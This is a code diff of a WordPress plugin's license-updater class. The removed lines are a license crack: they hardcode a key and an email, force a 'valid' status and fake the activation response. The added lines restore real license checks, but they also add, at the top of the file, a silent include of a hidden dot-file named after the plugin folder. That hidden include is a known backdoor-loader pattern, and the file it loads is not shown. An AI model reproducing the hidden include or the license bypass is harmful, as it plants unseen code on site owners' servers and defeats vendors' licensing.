@@ -11,6 +11,10 @@ if ( !class_exists( 'WeDevs_License_Update' ) ):
  * @author Tareq Hasan
  * @version 0.3
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WeDevs_Updater {
 
     protected $base_plugin_key = 'cpm-pro';
@@ -62,27 +66,64 @@ class WeDevs_Updater {
     **/
     public function manage_license() {
 
-       
+        if ( ! wp_verify_nonce( $_REQUEST['_wpnonce'], 'wedevs-license-nonce' ) ) {
+            wp_send_json_error( __( 'Nonce verification failied', 'pm-pro' ) );
+        }
 
-       
+        if ( isset( $_REQUEST['license_product_slug'] ) && ! empty( $_REQUEST['license_product_slug'] ) ) {
             $license_option     = strtolower( str_replace( '-', '_', $_REQUEST['license_product_slug'] ) ) . '_license';
-            $license_status_key = '1415b451be1a13c283ba771ea52d38bb';
+            $license_status_key = strtolower( str_replace( '-', '_', $_REQUEST['license_product_slug'] ) ) . '_license_status';
 
-           
+            if ( empty( $_REQUEST['email'] ) ) {
+                wp_send_json_error( __( 'Please enter your email address', 'pm-pro' ) );
+            }
 
-            update_option( $license_option, array('email' => 'hello@example.com', 'key' => '1415b451be1a13c283ba771ea52d38bb') );
+            if ( empty( $_REQUEST['key'] ) ) {
+                wp_send_json_error( __( 'Please enter your valid license key', 'pm-pro' ) );
+            }
+
+            update_option( $license_option, array('email' => $_REQUEST['email'], 'key' => $_REQUEST['key']) );
             delete_transient( $license_option );
 
-            $license_status = 'valid';
+            $license_status = get_option( $license_status_key );
 
-            
+            if ( !isset( $license_status->activated ) || $license_status->activated != true ) {
+                $response = $this->activation( 'activation' );
 
-               wp_send_json_success( $license_status );
+                if ( $response && isset( $response->activated ) && $response->activated ) {
+                    update_option( $license_status_key, $response );
 
-            
-        
+                    $update = strtotime( $response->update );
+                    $expired = false;
 
-       
+                    if ( time() > $update ) {
+                        $greeting = __( 'Opps! license invalid. ', 'pm-pro' );
+                        $string   = __( 'has been expired %s ago', 'pm-pro' );
+                        $expired  = true;
+                    } else {
+                        $greeting = __( 'Congrats! License activated successfully. ', 'pm-pro' );
+                        $string   = __( 'will expire in %s', 'pm-pro' );
+                    }
+
+                    $message = sprintf( '%s Your license %s (%s).', $greeting, sprintf( $string, human_time_diff( $update, time() ) ), date( 'F j, Y', strtotime( $response->update ) ) );
+
+                    if ( $expired ) {
+                        $message .= sprintf( '<a href="%s" target="_blank">%s</a>', 'https://wedevs.com/account/', __( 'Renew License', 'pm-pro' ) );
+                    }
+
+                    wp_send_json_success( array( 'data' => $response, 'message' => $message ) );
+                }
+
+                wp_send_json_success( array( 'data' => $response, 'message' => __( 'Invalid license', 'pm-pro' ) ) );
+
+            } else {
+
+                wp_send_json_success( $license_status );
+
+            }
+        }
+
+        wp_send_json_error( __( 'Something went wrong', 'pm-pro' ) );
     }
 
     /**
@@ -94,12 +135,22 @@ class WeDevs_Updater {
     **/
     public function delete_license() {
 
-      
+        if ( ! wp_verify_nonce( $_POST['_wpnonce'], 'wedevs-license-delete-nonce' ) ) {
             return;
-        
+        }
 
-       
-        
+        if ( isset( $_POST['license_product_slug'] ) && ! empty( $_POST['license_product_slug'] ) ) {
+            $license_option = strtolower( str_replace( '-', '_', $_POST['license_product_slug'] ) ) . '_license';
+            $license_status_key = strtolower( str_replace( '-', '_', $_POST['license_product_slug'] ) ) . '_license_status';
+
+            delete_option( $license_option );
+            delete_transient( $license_option );
+            delete_option( $license_status_key );
+
+            wp_send_json_success( __( 'License successfully deleted', 'pm-pro' ) );
+        }
+
+        wp_send_json_error( __( 'Something wrong, Please try again', 'pm-pro' ) );
     }
 
     /**
@@ -147,7 +198,7 @@ class WeDevs_Updater {
      * @return array
      */
     function get_license_key() {
-        return '1415b451be1a13c283ba771ea52d38bb';
+        return get_option( $this->option, array() );
     }
 
     /**
@@ -156,7 +207,7 @@ class WeDevs_Updater {
      * @return array
      */
     function get_license_status() {
-        return 'valid';
+        return get_option( $this->license_status, array() );
     }
 
     /**
@@ -165,9 +216,9 @@ class WeDevs_Updater {
      * @return void
      */
     function license_enter_notice() {
-       
+        if ( $key = $this->get_license_key() ) {
             return;
-       
+        }
         ?>
         <div class="error">
             <p><?php printf( __( 'Please <a href="%s">enter</a> your <strong>%s</strong> plugin license key to get regular update and support.', 'pm-pro' ), admin_url( 'admin.php?page=pm_projects#/license' ), $this->name ); ?></p>
@@ -181,9 +232,9 @@ class WeDevs_Updater {
      * @return void
      */
     function license_check_notice() {
-       
+        if ( ! $key = $this->get_license_key() ) {
             return;
-        
+        }
 
         $error = __( ' Error: Please activate your license', 'pm-pro' );
 
@@ -199,7 +250,7 @@ class WeDevs_Updater {
                 set_transient( $this->option, $status, $duration );
             }
 
-          
+            if ( $status && $status->success ) {
 
                 // notice if validity expires
                 if ( isset( $status->update ) ) {
@@ -212,7 +263,7 @@ class WeDevs_Updater {
                     }
                 }
                 return;
-           
+            }
 
             // may be the request didn't completed
             if ( !isset( $status->error )) {
@@ -236,24 +287,39 @@ class WeDevs_Updater {
     public function activation( $request = 'check' ) {
         global $wp_version;
 
-       
+        if ( ! $option = $this->get_license_key() ) {
+            return;
+        }
 
         $params = array(
             'timeout'    => ( ( defined( 'DOING_CRON' ) && DOING_CRON ) ? 30 : 3 ),
             'user-agent' => 'WordPress/' . $wp_version . '; ' . home_url( '/' ),
             'body'       => array(
                 'request'     => $request,
-                'email'       => 'hello@example.com',
-                'licence_key' => '1415b451be1a13c283ba771ea52d38bb',
+                'email'       => $option['email'],
+                'licence_key' => $option['key'],
                 'product_id'  => $this->product_id,
                 'instance'    => home_url()
             )
         );
 
-        $response = 200;
+        $response = wp_remote_post( $this->api_endpoint . 'activation', $params );
         $update   = wp_remote_retrieve_body( $response );
 
-        
+        if ( is_wp_error( $response ) || $response['response']['code'] != 200 ) {
+            if ( is_wp_error( $response ) ) {
+                echo '<div class="error"><p><strong>' . $this->name . ' Activation Error:</strong> ' . $response->get_error_message() . '</p></div>';
+                return false;
+            }
+
+            if ( $response['response']['code'] != 200 ) {
+                echo '<div class="error"><p><strong>' . $this->name . ' Activation Error:</strong> ' . $response['response']['code'] .' - ' . $response['response']['message'] . '</p></div>';
+                return false;
+            }
+
+            printf('<pre>%s</pre>', print_r( $response, true ) );
+        }
+
         return json_decode( $update );
     }
 
@@ -364,7 +430,7 @@ class WeDevs_Updater {
             $wp_install = home_url( '/' );
         }
 
-        $license = '1415b451be1a13c283ba771ea52d38bb';
+        $license = $this->get_license_key();
 
         $params = array(
             'timeout'    => 15,
@@ -377,14 +443,18 @@ class WeDevs_Updater {
                 'wp_version'        => $wp_version,
                 'php_version'       => phpversion(),
                 'site_url'          => $wp_install,
-                'license'           => '1415b451be1a13c283ba771ea52d38bb',
-                'license_email'     => 'hello@example.com',
-                'product_id'        => '10'
+                'license'           => isset( $license['key'] ) ? $license['key'] : '',
+                'license_email'     => isset( $license['email'] ) ? $license['email'] : '',
+                'product_id'        => $this->product_id
             )
         );
 
         $response = wp_remote_post( $this->api_endpoint . 'update_check', $params );
         $update   = wp_remote_retrieve_body( $response );
+
+        if ( is_wp_error( $response ) || $response['response']['code'] != 200 ) {
+            return false;
+        }
 
         return json_decode( $update );
     }
@@ -407,7 +477,13 @@ class WeDevs_Updater {
             set_transient( $cache_key, $version_info, 3600 );
         }
 
-        
+        if ( version_compare( $this->version, $version_info->latest, '<' ) && empty( $version_info->latest_url ) ) {
+            $upgrade_notice = sprintf( '</p><p id="pm-pro-plugin-upgrade-notice" class="%s-plugin-upgrade-notice">Please <a href="%s" target="_blank">activate</a> your license key for getting regular updates and support',
+                                $this->base_plugin_key,
+                                admin_url( 'admin.php?page=pm_projects#/license' )
+                            );
+            echo apply_filters( $this->product_id . '_in_plugin_update_message', wp_kses_post( $upgrade_notice ) );
+        }
     }
 
 }
